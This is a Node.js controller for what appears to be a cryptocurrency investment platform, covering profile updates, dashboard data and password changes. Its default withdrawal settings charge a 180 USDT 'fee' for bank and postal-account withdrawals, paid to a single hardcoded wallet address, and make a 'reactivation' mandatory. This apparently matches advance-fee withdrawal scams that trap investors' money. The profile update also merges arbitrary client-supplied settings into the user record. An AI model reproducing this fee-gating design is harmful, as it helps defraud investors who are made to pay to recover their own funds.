const User = require('../models/User');
const Wallet = require('../models/Wallet');
const Transaction = require('../models/Transaction');
const Investment = require('../models/Investment');
const { asyncHandler } = require('../utils/asyncHandler');
const AppError = require('../utils/appError');
const bcrypt = require('bcryptjs');
const logger = require('../utils/logger');
const { getCurrencyFromCountry } = require('../utils/countryCurrencyMap');

// ═══════════════════════════════════════════════════════════
// ✅ DEFAULT WITHDRAWAL SETTINGS (must match Wallet model)
// ═══════════════════════════════════════════════════════════
const DEFAULT_WITHDRAWAL_SETTINGS = {
  withdrawalLimit: 1500,
  thresholdLimit: 1000,
  minimumWithdrawal: 1,
  iban: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  ccp: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  reactivation: {
    isRequired: true,
    isLocked: false,
    lockedAt: null,
    unlockedAt: null,
    unlockCount: 0,
  },
  bypassSecurityCheck: false,
};

const DEFAULT_TRANSACTION_STATS = {
  totalTransactions: 0,
  totalDepositCount: 0,
  totalWithdrawalCount: 0,
  lastDepositAt: null,
  lastWithdrawalAt: null,
};

// ═══════════════════════════════════════════════════════════
// Get user profile
// ═══════════════════════════════════════════════════════════
exports.getProfile = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id).select('-password');
  if (!user) {
    throw new AppError('User not found', 404);
  }
  res.json({ success: true, data: user });
});

// ═══════════════════════════════════════════════════════════
// ✅ Update user profile (with country → currency auto-sync)
// ═══════════════════════════════════════════════════════════
exports.updateProfile = asyncHandler(async (req, res) => {
  const { fullName, email, phone, country, currency, settings } = req.body;

  const user = await User.findById(req.user._id);
  if (!user) {
    throw new AppError('User not found', 404);
  }

  // Basic fields
  if (fullName !== undefined) user.fullName = fullName;
  if (email !== undefined) user.email = email;
  if (phone !== undefined) user.phone = phone;

  // ✅ Country + Currency sync
  // If the user changed their country but did NOT pass a currency,
  // auto-derive the correct currency from the country map.
  const countryChanged = country !== undefined && country !== user.country;
  const currencyExplicitlySet = currency !== undefined && currency !== '';

  if (country !== undefined) {
    user.country = country;
  }

  if (currencyExplicitlySet) {
    // User or admin explicitly set the currency — respect it
    user.currency = currency;
  } else if (countryChanged) {
    // Country changed but no currency provided — derive it
    const derived = getCurrencyFromCountry(country);
    if (derived?.currency) {
      user.currency = derived.currency;
      logger.info(
        `Auto-synced currency for user ${user._id}: ${country} → ${derived.currency}`
      );
    }
    // If we can't derive, keep the existing currency (safer than setting undefined)
  }

  // Settings
  if (settings) {
    user.settings = { ...(user.settings || {}), ...settings };
  }

  await user.save();

  res.json({
    success: true,
    data: user,
    message: 'Profile updated successfully',
  });
});

// ═══════════════════════════════════════════════════════════
// ✅ Get dashboard data (with per-account withdrawal settings)
// ═══════════════════════════════════════════════════════════
exports.getDashboard = asyncHandler(async (req, res) => {
  const userId = req.user._id;

  // ─── Get wallet (create with full defaults if missing) ────
  let wallet = await Wallet.findOne({ user: userId });

  if (!wallet) {
    // ✅ Create with full per-account defaults (not just userId)
    wallet = await Wallet.create({
      user: userId,
      balance: 0,
      profitBalance: 0,
      referralBalance: 0,
      totalDeposits: 0,
      totalWithdrawals: 0,
      pendingDepositAmount: 0,
      pendingWithdrawalAmount: 0,
      cryptoAddresses: { BTC: '', ETH: '', USDT: '', BNB: '', TRX: '' },
      withdrawalSettings: DEFAULT_WITHDRAWAL_SETTINGS,
      transactionStats: DEFAULT_TRANSACTION_STATS,
      accountTier: 'standard',
    });
    logger.info(`Wallet auto-created on dashboard load for user ${userId}`);
  }

  // ─── Safety: ensure the new fields exist on legacy wallets ──
  let needsSave = false;
  if (!wallet.withdrawalSettings) {
    wallet.withdrawalSettings = DEFAULT_WITHDRAWAL_SETTINGS;
    needsSave = true;
  }
  if (!wallet.transactionStats) {
    wallet.transactionStats = DEFAULT_TRANSACTION_STATS;
    needsSave = true;
  }
  if (!wallet.accountTier) {
    wallet.accountTier = 'standard';
    needsSave = true;
  }
  if (needsSave) {
    await wallet.save();
  }

  // ─── Recent transactions ──────────────────────────────────
  const transactions = await Transaction.find({ user: userId })
    .sort({ createdAt: -1 })
    .limit(10);

  // ─── Active investments ───────────────────────────────────
  const investments = await Investment.find({ user: userId, status: 'active' });

  // ─── Return everything the frontend needs ─────────────────
  res.json({
    success: true,
    data: {
      wallet: {
        _id: wallet._id,
        balance: wallet.balance,
        profitBalance: wallet.profitBalance,
        referralBalance: wallet.referralBalance,
        totalDeposits: wallet.totalDeposits,
        totalWithdrawals: wallet.totalWithdrawals,
        pendingDepositAmount: wallet.pendingDepositAmount,
        pendingWithdrawalAmount: wallet.pendingWithdrawalAmount,
        walletAddress: wallet.cryptoAddresses?.USDT || '0x...',
        cryptoAddresses: wallet.cryptoAddresses,
        // ✅ NEW: per-account settings surfaced to the frontend
        withdrawalSettings: wallet.withdrawalSettings,
        transactionStats: wallet.transactionStats,
        accountTier: wallet.accountTier,
        createdAt: wallet.createdAt,
        updatedAt: wallet.updatedAt,
      },
      transactions,
      investments,
    },
  });
});

// ═══════════════════════════════════════════════════════════
// Change password
// ═══════════════════════════════════════════════════════════
exports.changePassword = asyncHandler(async (req, res) => {
  const { currentPassword, newPassword } = req.body;

  if (!currentPassword || !newPassword) {
    throw new AppError('Please provide current and new password', 400);
  }

  if (newPassword.length < 6) {
    throw new AppError('New password must be at least 6 characters', 400);
  }

  const user = await User.findById(req.user._id).select('+password');
  if (!user) {
    throw new AppError('User not found', 404);
  }

  const isMatch = await user.matchPassword(currentPassword);
  if (!isMatch) {
    throw new AppError('Current password is incorrect', 401);
  }

  user.password = newPassword;
  await user.save();

  res.json({
    success: true,
    message: 'Password updated successfully',
  });
});